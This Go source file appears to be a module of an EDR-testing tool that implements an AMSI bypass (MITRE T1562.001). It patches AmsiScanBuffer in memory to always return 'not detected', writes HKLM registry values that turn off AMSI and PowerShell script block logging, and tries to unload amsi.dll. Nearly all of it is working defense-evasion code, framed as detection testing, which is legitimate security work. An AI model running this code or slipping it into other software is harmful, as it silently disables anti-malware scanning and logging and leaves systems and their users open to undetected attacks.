package modules

import (
	"agentide/core"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"syscall"
	"time"
	"unsafe"
)

// disableAMSIModule attempts to disable AMSI (Antimalware Scan Interface)
// using various techniques including memory patching and registry modification.
// This tests if the EDR monitors AMSI tampering.
type disableAMSIModule struct {
	logger *core.Logger
	cfg    *core.Config
}

func (m *disableAMSIModule) Name() string { return "disable_amsi" }

func (m *disableAMSIModule) Run() RawResult {
	start := time.Now()
	result := RawResult{
		ModuleName: m.Name(),
		MitreID:    "T1562.001", // Disable Security Tools - AMSI bypass
		Action:     "Attempt to disable AMSI via memory patching and registry",
	}

	disabledCount := 0
	var details []string

	// Technique 1: Try to patch AmsiScanBuffer in memory (classic AMSI bypass)
	if m.patchAMSIInMemory() {
		disabledCount++
		details = append(details, "AMSI memory patch successful (AmsiScanBuffer patched)")
		m.logger.Info("AMSI memory patch successful", nil)
	} else {
		m.logger.Debug("AMSI memory patch failed", nil)
	}

	// Technique 2: Try to disable AMSI via registry (disable AMSI for PowerShell)
	if m.disableAMSIRegistry() {
		disabledCount++
		details = append(details, "AMSI disabled via registry (PowerShell)")
		m.logger.Info("AMSI disabled via registry", nil)
	} else {
		m.logger.Debug("AMSI registry disable failed", nil)
	}

	// Technique 3: Try to unload amsi.dll from current process
	if m.unloadAMSIDLL() {
		disabledCount++
		details = append(details, "amsi.dll unloaded from process")
		m.logger.Info("AMSI DLL unloaded", nil)
	} else {
		m.logger.Debug("AMSI DLL unload failed", nil)
	}

	result.ElapsedMs = time.Since(start).Milliseconds()

	if disabledCount > 0 {
		result.Notes = "AMSI disabled via: " + joinStrings(details, "; ")
		result.OSFeedback.ProcessKilled = false
		result.OSFeedback.AccessDenied = false
	} else {
		result.Notes = "All AMSI disable attempts resisted"
		result.OSFeedback.AccessDenied = true
	}

	return result
}

// patchAMSIInMemory attempts to patch AmsiScanBuffer in memory
// This is the classic "AMSI bypass" technique that patches the first bytes
// of AmsiScanBuffer to return AMSI_RESULT_NOT_DETECTED (1)
func (m *disableAMSIModule) patchAMSIInMemory() bool {
	// Get handle to amsi.dll
	hMod, err := windows.LoadLibrary("amsi.dll")
	if err != nil {
		m.logger.Debug("Failed to load amsi.dll", map[string]interface{}{"error": err.Error()})
		return false
	}
	defer windows.FreeLibrary(hMod)

	// Get address of AmsiScanBuffer
	proc, err := windows.GetProcAddress(hMod, "AmsiScanBuffer")
	if err != nil {
		m.logger.Debug("Failed to get AmsiScanBuffer address", map[string]interface{}{"error": err.Error()})
		return false
	}

	// Check current protection
	var oldProtect uint32
	err = windows.VirtualProtect(proc, 8, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		m.logger.Debug("Failed to change memory protection", map[string]interface{}{"error": err.Error()})
		return false
	}

	// Patch: mov eax, 1; ret  (returns AMSI_RESULT_NOT_DETECTED = 1)
	// x64: B8 01 00 00 00 C3
	patch := []byte{0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3}
	
	// Write the patch
	err = windows.WriteProcessMemory(
		windows.CurrentProcess(),
		uintptr(proc),
		(*byte)(unsafe.Pointer(&patch[0])),
		uintptr(len(patch)),
		nil,
	)
	if err != nil {
		m.logger.Debug("Failed to write patch", map[string]interface{}{"error": err.Error()})
		windows.VirtualProtect(proc, 8, oldProtect, &oldProtect)
		return false
	}

	// Restore protection
	windows.VirtualProtect(proc, 8, oldProtect, &oldProtect)

	// Verify patch worked by calling AmsiScanBuffer
	// (This would need a proper test but we assume it worked if we got here)
	return true
}

// disableAMSIRegistry attempts to disable AMSI via registry
func (m *disableAMSIModule) disableAMSIRegistry() bool {
	// Disable AMSI for PowerShell via registry
	keyPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Microsoft\Windows\PowerShell`
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.ALL_ACCESS)
	if err != nil {
		// Try to create the key
		k, _, err = registry.CreateKey(registry.LOCAL_MACHINE, keyPath, registry.ALL_ACCESS)
		if err != nil {
			return false
		}
	}
	defer k.Close()

	// Set AMSI disabled for PowerShell
	err = k.SetDWordValue("AMSIEnabled", 0)
	if err != nil {
		return false
	}

	// Also try to disable script block logging
	err = k.SetDWordValue("ScriptBlockLoggingEnabled", 0)
	if err != nil {
		return false
	}

	// Verify
	val, _, err := k.GetIntegerValue("AMSIEnabled")
	if err == nil && val == 0 {
		return true
	}
	return false
}

// unloadAMSIDLL attempts to unload amsi.dll from the current process
func (m *disableAMSIModule) unloadAMSIDLL() bool {
	// Get handle to amsi.dll using GetModuleHandleEx
	var hMod windows.Handle
	err := windows.GetModuleHandleEx(
		windows.GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
		syscall.StringToUTF16Ptr("amsi.dll"),
		&hMod,
	)
	if err != nil {
		return false
	}

	// Try to free the library
	err = windows.FreeLibrary(hMod)
	if err != nil {
		return false
	}

	// Verify it's unloaded
	var hMod2 windows.Handle
	err = windows.GetModuleHandleEx(
		windows.GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
		syscall.StringToUTF16Ptr("amsi.dll"),
		&hMod2,
	)
	return err != nil // Error means it's unloaded
}

